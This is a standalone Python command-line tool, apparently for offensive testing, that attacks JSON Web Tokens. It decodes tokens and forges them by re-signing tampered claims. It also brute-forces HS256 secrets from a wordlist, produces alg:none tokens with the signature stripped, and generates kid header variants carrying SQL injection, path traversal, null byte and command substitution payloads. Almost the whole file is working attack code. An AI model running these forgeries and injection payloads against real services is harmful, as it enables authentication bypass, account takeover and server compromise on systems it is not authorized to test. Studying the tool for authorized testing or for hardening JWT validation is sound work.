#!/usr/bin/env python3
"""jwt_attack.py — JWT primitives: decode, tamper-resign, HS256 wordlist
brute, alg:none, and kid injection payloads. HMAC via stdlib.

Usage
-----
    python jwt_attack.py decode <token>
    python jwt_attack.py tamper <token> --claims '<json>' --secret <key>
    python jwt_attack.py brute  <token> --wordlist <file>
    python jwt_attack.py none   <token>
    python jwt_attack.py kid    <token> --payload <string>
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys
from typing import Iterable


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def b64url_decode(s: str) -> bytes:
    pad = "=" * ((-len(s)) % 4)
    return base64.urlsafe_b64decode(s + pad)


def decode(token: str) -> tuple[dict, dict, bytes]:
    """Return ``(header, payload, signature_bytes)``."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"expected 3 segments, got {len(parts)}")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig = b64url_decode(parts[2]) if parts[2] else b""
    return header, payload, sig


def _signing_input(header: dict, payload: dict) -> str:
    h = b64url_encode(json.dumps(header, separators=(",", ":"), sort_keys=False).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":"), sort_keys=False).encode())
    return f"{h}.{p}"


def encode(header: dict, payload: dict, secret: bytes | None = None) -> str:
    """Encode a JWT. Signs HS256/HS384/HS512 if ``secret`` is given. If
    header alg is ``none`` (any case), emits an empty signature segment."""
    si = _signing_input(header, payload)
    alg = str(header.get("alg", "")).lower()
    if alg == "none":
        return f"{si}."
    if secret is None:
        return f"{si}."
    if alg == "hs256":
        sig = hmac.new(secret, si.encode(), hashlib.sha256).digest()
    elif alg == "hs384":
        sig = hmac.new(secret, si.encode(), hashlib.sha384).digest()
    elif alg == "hs512":
        sig = hmac.new(secret, si.encode(), hashlib.sha512).digest()
    else:
        raise ValueError(f"unsupported alg for HMAC signing: {header.get('alg')!r}")
    return f"{si}.{b64url_encode(sig)}"


def brute_hs256(token: str, wordlist: Iterable[str]) -> str | None:
    """Try each candidate as the HS256 secret. Return the first match."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("malformed token")
    si = (parts[0] + "." + parts[1]).encode()
    sig = b64url_decode(parts[2])
    for candidate in wordlist:
        c = candidate.strip()
        if not c:
            continue
        guess = hmac.new(c.encode(), si, hashlib.sha256).digest()
        if hmac.compare_digest(guess, sig):
            return c
    return None


def alg_none(token: str) -> str:
    """Variant of ``token`` with alg=none and an empty signature."""
    header, payload, _ = decode(token)
    header["alg"] = "none"
    si = _signing_input(header, payload)
    return f"{si}."


def kid_payloads(token: str, injection: str) -> list[str]:
    """Variants of ``token`` with the header ``kid`` field set to common
    SQLi / path-traversal / command-substitution shapes around ``injection``."""
    header, payload, sig = decode(token)
    variants: list[str] = []
    candidates = [
        injection,
        f"' UNION SELECT '{injection}' -- ",
        f"../../../../../{injection}",
        f"/dev/null\x00{injection}",
        f"x'||'{injection}",
        f"$(({injection}))",
    ]
    for kid in candidates:
        h = dict(header)
        h["kid"] = kid
        si = _signing_input(h, payload)
        # Preserve original signature bytes — server still treats payload as signed
        variants.append(f"{si}.{b64url_encode(sig)}")
    return variants


def main() -> None:
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("decode")
    d.add_argument("token")

    t = sub.add_parser("tamper")
    t.add_argument("token")
    t.add_argument("--claims", required=True, help="JSON object of new claims (merged into payload)")
    t.add_argument("--secret", required=True)

    b = sub.add_parser("brute")
    b.add_argument("token")
    b.add_argument("--wordlist", required=True)

    n = sub.add_parser("none")
    n.add_argument("token")

    k = sub.add_parser("kid")
    k.add_argument("token")
    k.add_argument("--payload", required=True)

    args = ap.parse_args()

    if args.cmd == "decode":
        h, p, s = decode(args.token)
        print("header:", json.dumps(h, indent=2))
        print("payload:", json.dumps(p, indent=2))
        print(f"signature: {len(s)} bytes ({s.hex()})")
    elif args.cmd == "tamper":
        h, p, _ = decode(args.token)
        new_claims = json.loads(args.claims)
        p.update(new_claims)
        print(encode(h, p, secret=args.secret.encode()))
    elif args.cmd == "brute":
        with open(args.wordlist) as fh:
            found = brute_hs256(args.token, fh)
        if found:
            print(f"secret: {found!r}")
        else:
            sys.exit("no match in wordlist")
    elif args.cmd == "none":
        print(alg_none(args.token))
    elif args.cmd == "kid":
        for v in kid_payloads(args.token, args.payload):
            print(v)


if __name__ == "__main__":
    main()
